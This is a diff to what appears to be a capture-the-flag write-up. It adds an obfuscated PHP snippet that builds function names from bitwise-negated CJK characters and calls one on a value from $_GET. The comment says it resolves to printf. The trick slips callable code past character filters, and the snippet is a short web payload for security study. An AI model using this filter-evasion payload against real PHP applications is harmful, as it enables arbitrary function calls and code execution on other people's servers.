@@ -81,6 +81,13 @@ print('$___=' + '.'.join([f'~{toUnicode(c)}[$_]' for c in '_GET']) + ';') # stri
 print(f'$__($$___[$_]);') # $$___[$_] means $_GET["1"]
 ```
 
+```php
+$_=_==_;
+$__=~䏀[$_].~䍀[$_].~䖀[$_].~䑀[$_].~䋀[$_].~䙀[$_];
+$___=~䠀[$_].~一[$_].~亀[$_].~䫀[$_];
+$__($$___[$_]); // printf($_GET["1"]);
+```
+
 ## rev
 ### python (sasdf)
 We construct the pyc from `opcode.txt` and then decompile with `uncompyle6` (If you are interestring in how to construct pyc, google for types.CodeType and marshal), and then we have following code:
